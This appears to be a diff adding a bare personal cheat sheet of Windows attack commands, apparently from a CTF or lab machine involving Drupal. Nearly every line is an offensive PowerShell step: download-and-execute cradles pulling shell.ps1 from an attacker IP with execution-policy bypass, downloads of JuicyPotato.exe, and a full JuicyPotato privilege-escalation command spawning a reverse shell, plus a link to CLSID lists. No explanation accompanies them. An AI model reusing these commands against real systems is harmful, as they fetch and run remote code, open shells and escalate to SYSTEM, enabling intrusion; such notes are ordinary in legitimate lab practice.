@@ -1,0 +1,25 @@
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.17/shell.ps1')"
+
+
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.17/JuicyPotato.exe')
+
+
+
+(New-Object Net.WebClient).DownloadFile("http://10.10.16.17/JuicyPotato.exe","C:\Users\dimitris\Desktop\JuicyPotato.exe")
+
+Invoke-WebRequest "http://10.10.16.17:80/JuicyPotato.exe" -OutFile "JuicyPotato.exe"
+
+powershell "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.16.17/JuicyPotato.exe','C:\Users\dimitris\Desktop\JuicyPotato.exe')"
+
+
+(New-Object Net.WebClient).downloadFile('http://10.10.16.17/JuicyPotato.exe','C:\Users\dimitris\Desktop\JuicyPotato.exe')
+
+
+"/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.16.17/shell.ps1')" -t *
+
+
+.\JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.16.17/shell.ps1')" -t *
+
+https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise
+
+drupal u know how it is it sucks
